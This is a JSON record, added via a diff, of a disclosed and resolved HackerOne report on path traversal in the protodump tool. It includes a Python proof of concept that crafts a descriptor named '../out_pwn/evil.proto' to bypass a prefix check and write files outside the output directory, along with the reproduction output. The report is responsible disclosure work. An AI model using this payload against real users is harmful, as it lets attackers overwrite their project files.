@@ -1,0 +1,136 @@
+{
+  "id": 3634571,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjM0NTcx",
+  "url": "https://hackerone.com/reports/3634571",
+  "title": "Path Traversal in writeFile via Unsafe Prefix Containment Check Allows Out-of-Directory Writes",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-28T17:06:18.207Z",
+  "submitted_at": "2026-03-28T17:06:18.808Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "tipsen",
+    "url": "/tipsen",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hjd58gb9dlkdxr27cjeu4k8ianat/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 29833,
+    "url": "https://hackerone.com/arkadiyt-projects",
+    "handle": "arkadiyt-projects",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/029/833/c7d79126a63550aa7c99662ecb49eca1a8b2d1c3_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/029/833/c7d79126a63550aa7c99662ecb49eca1a8b2d1c3_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "arkadiyt-projects",
+      "twitter_handle": "arkadiyt",
+      "website": "https://arkadiyt.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-03-31T02:04:58.974Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-03-31T02:04:16.627Z",
+  "team_member_agreed_on_going_public_at": "2026-03-31T02:04:58.598Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n`protodump` uses descriptor-controlled paths (`name/go_package`) in output filename construction and then enforces containment with a lexical `strings.HasPrefix` check after `EvalSymlinks`. That check is bypassable with `../` traversal into existing prefix-matching sibling directories, enabling writes outside the intended output directory.\n\n## Steps To Reproduce:\n1. First of all, build the protodump\n2. Then, create a malicious input blob (descriptor name = `../out_pwn/evil.proto`):\n```python\nname = b'../out_pwn/evil.proto'\nwith open('/tmp/evil.bin', 'wb') as f:\n    f.write(bytes([0x0a, len(name)]) + name + b'\\x00')\n```\n3. Prepare output and prefix-collision sibling `mkdir -p /tmp/out /tmp/out_pwn`\n\n4. Run protodump:\n```bash\nTIPSEN:~:% /tmp/protodump -file /tmp/evil.bin -output /tmp/out\nWrote /tmp/out_pwn/evil.proto\n```\n\n5. Full terminal output:\n```bash\nTIPSEN:~:% python\nPython 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> name = b'../out_pwn/evil.proto'\n... with open('/tmp/evil.bin', 'wb') as f:\n...     f.write(bytes([0x0a, len(name)]) + name + b'\\x00')\n...\n24\n>>> exit\nTIPSEN:~:% mkdir -p /tmp/out /tmp/out_pwn\nTIPSEN:~:% ls /tmp/out\nTIPSEN:~:% ls /tmp/out_pwn\nTIPSEN:~:% /tmp/protodump -file /tmp/evil.bin -output /tmp/out\nWrote /tmp/out_pwn/evil.proto\nTIPSEN:~:% ls /tmp/out\nTIPSEN:~:% ls /tmp/out_pwn\nevil.proto\n```\n\n## Supporting Material/References:\nThe root cause :)\n1. https://github.com/arkadiyt/protodump/tree/main/pkg/protodump/proto.go#L47-L55: `Filename()` builds output-relative paths from descriptor-controlled meta data (`go_package` + descriptor path), so attacker input can influence directory components.\n2. https://github.com/arkadiyt/protodump/tree/main/cmd/protodump/main.go#L98-L100: the attacker-influenced `filename` is passed directly into `writeFile(...)` and used for filesystem writes.\n3. https://github.com/arkadiyt/protodump/tree/main/cmd/protodump/main.go#L32-L35: directory parts are derived from `path.Clean(fileDir)` and then joined under output, so traversal tokens are processed into parent/sibling path movement.\n4. https://github.com/arkadiyt/protodump/tree/main/cmd/protodump/main.go#L41-L47: containment is enforced with `strings.HasPrefix(base, outputDirAbs)`, which is a lexical prefix check and not a safe path-boundary check.\n5. `https://github.com/arkadiyt/protodump/tree/main/cmd/protodump/main.go#L51-L58`: after the flawed check, `MkdirAll` + `WriteFile` create/write the final path, enabling out-of-directory write when prefix-collision conditions are met.\n\n## Impact\n\nAn attacker who can provide a crafted binary can cause `protodump` to create or overwrite `.proto` files outside the user-selected output folder when the victim runs the tool. This enables integrity compromise of adjacent project artifacts.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-04-30T02:04:16.931Z",
+  "allow_singular_disclosure_after": -224298.469239583,
+  "singular_disclosure_allowed": true,
+  "vote_count": 20,
+  "voters": [
+    "tipsen",
+    "2026",
+    "winstoncrooker",
+    "gr0va",
+    "rutuj",
+    "josephcybersecurity",
+    "cerebro_virgil",
+    "tonettao",
+    "cnelly009",
+    "ofefe",
+    "and 10 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.7,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "high",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 390761,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/arkadiyt/protodump",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
